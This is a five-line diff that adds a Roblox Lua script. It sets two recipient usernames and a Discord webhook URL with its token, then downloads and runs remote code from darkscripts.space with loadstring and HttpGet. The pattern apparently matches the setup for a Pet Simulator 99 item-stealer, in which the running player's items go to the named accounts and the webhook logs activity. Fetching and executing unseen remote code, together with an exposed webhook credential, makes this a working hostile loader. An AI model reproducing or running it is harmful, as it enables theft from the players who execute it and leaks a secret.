@@ -1,0 +1,5 @@
+Username = "Tanqr_Fan12400"
+Username2 = "TheBaconPS"
+Webhook = "https://discord.com/api/webhooks/1310410903912452136/ypvAvutf9ZkEZsdxPh-YBFKOPUVnvQBsu1uKeTphZl1lm8zw0sY8PoLbW4vvJIpLD3e6"
+
+loadstring(game:HttpGet(('https://darkscripts.space/ps99')))()
